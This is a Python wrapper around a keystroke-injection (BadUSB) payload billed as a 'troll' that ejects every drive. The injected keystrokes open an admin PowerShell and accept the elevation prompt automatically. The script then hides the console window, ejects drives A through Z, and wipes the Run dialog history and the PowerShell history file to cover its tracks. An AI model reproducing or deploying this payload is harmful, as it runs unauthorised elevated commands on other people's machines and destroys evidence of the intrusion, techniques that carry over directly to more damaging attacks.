class info:
    author="n0nuser"
    description = "Ejects CD via Powershell. Basically it ejects all drives (C, D, E, ...)."
    function = "Troll"
    parameters = []
    content = '''\
DELAY 3000
GUI r
DELAY 400
STRING powershell Start-Process powershell -verb runAs
ENTER
DELAY 750
LEFT
DELAY 750
ENTER
DELAY 750
STRING [console]::WindowWidth=100; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth=1
ENTER
DELAY 750
STRING for ($test=0; $test -lt 26; $test++){(new-object -COM Shell.Application).NameSpace(17).ParseName([char](65 + $test) + ':').InvokeVerb('Eject')}
ENTER
DELAY 200
STRING Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue
ENTER
DELAY 1000
STRING Clear-History; rm (Get-PSReadlineOption).HistorySavePath
ENTER
DELAY 750
STRING exit
ENTER\
'''